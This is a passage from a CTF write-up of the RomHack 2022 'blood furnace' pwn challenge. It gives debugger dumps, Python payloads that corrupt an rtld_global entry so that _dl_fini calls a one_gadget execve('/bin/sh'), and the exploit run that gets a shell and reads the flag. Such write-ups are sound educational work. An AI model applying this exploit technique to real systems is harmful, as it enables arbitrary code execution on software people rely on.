<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x3562413462413362 ("b3Ab4Ab5"?)
$rbx   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$rcx   : 0x0               
$rdx   : 0x2               
$rsp   : 0x00007fffffffd9d0  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$rbp   : 0x00007fffffffda50  →  0x0000000000000000
$rsi   : 0x3               
$rdi   : 0x0               
$rip   : 0x00007ffff7fc9151  →  &lt;_dl_fini+273&gt; cmp QWORD PTR [rax+0x28], rax
$r8    : 0x1999999999999999
$r9    : 0x0               
$r10   : 0x00007ffff7f4aac0  →  0x0000000100000000
$r11   : 0x00007ffff7f4b3c0  →  0x0002000200020002
$r12   : 0x0               
$r13   : 0x00007ffff7ffda48  →  0x0000000100000001
$r14   : 0x00007fffffffd9d0  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$r15   : 0x4               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7fc9148 &lt;_dl_fini+264&gt;   mov    rax, QWORD PTR [rax+0x18]
   0x7ffff7fc914c &lt;_dl_fini+268&gt;   test   rax, rax
   0x7ffff7fc914f &lt;_dl_fini+271&gt;   je     0x7ffff7fc917f &lt;_dl_fini+319&gt;
 → 0x7ffff7fc9151 &lt;_dl_fini+273&gt;   cmp    QWORD PTR [rax+0x28], rax
   0x7ffff7fc9155 &lt;_dl_fini+277&gt;   jne    0x7ffff7fc9148 &lt;_dl_fini+264&gt;
   0x7ffff7fc9157 &lt;_dl_fini+279&gt;   cmp    r15d, esi
   0x7ffff7fc915a &lt;_dl_fini+282&gt;   jbe    0x7ffff7fc937e &lt;_dl_fini+830&gt;
   0x7ffff7fc9160 &lt;_dl_fini+288&gt;   mov    edx, esi
   0x7ffff7fc9162 &lt;_dl_fini+290&gt;   mov    QWORD PTR [r14+rdx*8], rax
────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9d0│+0x0000: 0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f	 ← $rsp, $r14
0x00007fffffffd9d8│+0x0008: 0x00007ffff7ffe930  →  0x00007ffff7fc1000  →  0x00010102464c457f
0x00007fffffffd9e0│+0x0010: 0x00007ffff7fb4330  →  0x00007ffff7d8c000  →  0x03010102464c457f
0x00007fffffffd9e8│+0x0018: 0x00007ffff7fc90e6  →  &lt;_dl_fini+166&gt; mov eax, r15d
0x00007fffffffd9f0│+0x0020: 0x0000000000000003
0x00007fffffffd9f8│+0x0028: 0x00007fffffffd9f0  →  0x0000000000000003</code></pre></figure>

<p>We control <code class="language-plaintext highlighter-rouge">rax</code> and it’ll check, if <code class="language-plaintext highlighter-rouge">rax+0x28</code> equals <code class="language-plaintext highlighter-rouge">rax</code>. We can easily fulfill this check, since we control the complete chunk in <code class="language-plaintext highlighter-rouge">rtld_global</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># reallocate guild again (now overwriting entry in rtld_global)
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdead0000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee6</span><span class="p">)</span>		
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee7</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee9</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">LEAK2</span><span class="o">+</span><span class="mh">0xaa0</span><span class="p">)</span>    <span class="c1"># pointer to start of rtld entry to pass check
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdedbeea</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee4</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeeb</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee5</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
		
<span class="n">setguild</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<p>Running it again and exiting, we will pass the <code class="language-plaintext highlighter-rouge">cmp</code> and continue to</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x00007ffff7ffcee0  →  0x000000000000000b ("
                                                     "?)
$rbx   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$rcx   : 0x0               
$rdx   : 0x00007ffff7fbad20  →  0x00007ffff7fb7380  →  0x3d4d3d80fa1e0ff3
$rsp   : 0x00007fffffffd9d0  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$rbp   : 0x00007fffffffda50  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007ffff7fb4330  →  0x00007ffff7d8c000  →  0x03010102464c457f
$rip   : 0x00007ffff7fc926b  →  &lt;_dl_fini+555&gt; mov rax, QWORD PTR [rax+0x8]
$r8    : 0x00007fffffffd9d0  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$r9    : 0x20              
$r10   : 0x0               
$r11   : 0x00007fffffffd900  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$r12   : 0x0               
$r13   : 0x00007ffff7ffda48  →  0x0000000000000000
$r14   : 0x00007fffffffd9e8  →  0x00007ffff7ffdae0  →  0x00000000dead0000
$r15   : 0x00007ffff7ffdae0  →  0x00000000dead0000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7fc925f &lt;_dl_fini+543&gt;   mov    rax, QWORD PTR [r15+0xa8]
   0x7ffff7fc9266 &lt;_dl_fini+550&gt;   test   rax, rax
   0x7ffff7fc9269 &lt;_dl_fini+553&gt;   je     0x7ffff7fc9274 &lt;_dl_fini+564&gt;
 → 0x7ffff7fc926b &lt;_dl_fini+555&gt;   mov    rax, QWORD PTR [rax+0x8]
   0x7ffff7fc926f &lt;_dl_fini+559&gt;   add    rax, QWORD PTR [r15]
   0x7ffff7fc9272 &lt;_dl_fini+562&gt;   call   rax
   0x7ffff7fc9274 &lt;_dl_fini+564&gt;   mov    rdi, r15
   0x7ffff7fc9277 &lt;_dl_fini+567&gt;   call   0x7ffff7fde590 &lt;_dl_audit_objclose&gt;
   0x7ffff7fc927c &lt;_dl_fini+572&gt;   sub    DWORD PTR [r15+0x318], 0x1
───────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9d0│+0x0000: 0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f	 ← $rsp, $r8
0x00007fffffffd9d8│+0x0008: 0x00007ffff7ffe930  →  0x00007ffff7fc1000  →  0x00010102464c457f
0x00007fffffffd9e0│+0x0010: 0x00007ffff7fb4330  →  0x00007ffff7d8c000  →  0x03010102464c457f
0x00007fffffffd9e8│+0x0018: 0x00007ffff7ffdae0  →  0x00000000dead0000	 ← $r14
0x00007fffffffd9f0│+0x0020: 0x0000000000000003
0x00007fffffffd9f8│+0x0028: 0x00007fffffffd9f0  →  0x0000000000000003

gef➤  x/gx $rax+0x8
0x7ffff7ffcee8:	0x0000000000000018</code></pre></figure>

<p>This will take the value at <code class="language-plaintext highlighter-rouge">r15</code>, which points to the first value in our fake chunk, adds <code class="language-plaintext highlighter-rouge">0x18</code> (from <code class="language-plaintext highlighter-rouge">$rax+0x8</code>) to it and then calls it :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0xdead0018        
$rbx   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$rcx   : 0x0               
$rdx   : 0x00007ffff7fbad20  →  0x00007ffff7fb7380  →  0x3d4d3d80fa1e0ff3
$rsp   : 0x00007fffffffd9c8  →  0x00007ffff7fc9274  →  &lt;_dl_fini+564&gt; mov rdi, r15
$rbp   : 0x00007fffffffda50  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007ffff7fb4330  →  0x00007ffff7d8c000  →  0x03010102464c457f
$rip   : 0xdead0018        
$r8    : 0x00007fffffffd9d0  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$r9    : 0x20              
$r10   : 0x0               
$r11   : 0x00007fffffffd900  →  0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f
$r12   : 0x0               
$r13   : 0x00007ffff7ffda48  →  0x0000000000000000
$r14   : 0x00007fffffffd9e8  →  0x00007ffff7ffdae0  →  0x00000000dead0000
$r15   : 0x00007ffff7ffdae0  →  0x00000000dead0000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c8│+0x0000: 0x00007ffff7fc9274  →  &lt;_dl_fini+564&gt; mov rdi, r15	 ← $rsp
0x00007fffffffd9d0│+0x0008: 0x00007ffff7ffe2f0  →  0x00007ffff7fb6000  →  0x00010102464c457f	 ← $r8
0x00007fffffffd9d8│+0x0010: 0x00007ffff7ffe930  →  0x00007ffff7fc1000  →  0x00010102464c457f
0x00007fffffffd9e0│+0x0018: 0x00007ffff7fb4330  →  0x00007ffff7d8c000  →  0x03010102464c457f
0x00007fffffffd9e8│+0x0020: 0x00007ffff7ffdae0  →  0x00000000dead0000	 ← $r14
0x00007fffffffd9f0│+0x0028: 0x0000000000000003
[!] Cannot access memory at address 0xdead0018</code></pre></figure>

<p>So, we got rip control and what’s even better, this fulfills all constraints for the following <code class="language-plaintext highlighter-rouge">one_gadget</code></p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</code></pre></figure>

<p>All there’s left, is to put the address of our one_gadget (-0x18) at the start of our chunk and give it a go.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># reallocate guild again (now overwriting entry in rtld_global)	
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xebcf1</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee6</span><span class="p">)</span>		
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee7</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee9</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">LEAK2</span><span class="o">+</span><span class="mh">0xaa0</span><span class="p">)</span>    <span class="c1">#  pointer to start of rtld entry to pass check
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdedbeea</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee4</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeeb</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee5</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbee6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
		
<span class="n">setguild</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1"># exit to trigger one_gadget
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">kileak@beast:~/ctf/rom/bloodfurnace$ python xpl.py 1
[*] '/home/kileak/ctf/rom/bloodfurnace/t/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 104.248.162.85 on port 31273: Done
T:   The enemy counter attacked you!, Ouch!

T:   The enemy counter attacked you!, Ouch!

T:   The enemy counter attacked you!, Ouch!

T:   You delivered a fatal attack to the enemy!

[*] LEAK      : 0x7fbce482ef43
[*] LEAK LD   : 0x7fbce4a0c040
[*] LIBC      : 0x7fbce47a2000
[*] Switching to interactive mode
$ ls
blood_furnace
flag.txt
ld.so.2
libc.so.6
$ cat flag.txt
HTB{Bl00d_furnance_l1nck3r_c0rrupt1on}</code></pre></figure>



    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=RomHack 2022 CTF - blood furnace&amp;url=https://kileak.github.io/ctf/2022/romctf-bloodfurnace/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/romctf-bloodfurnace/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2022/romctf-bloodfurnace';
        var disqus_title = 'RomHack 2022 CTF - blood furnace';
        var disqus_url = 'https://kileak.github.io/ctf/2022/romctf-bloodfurnace';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
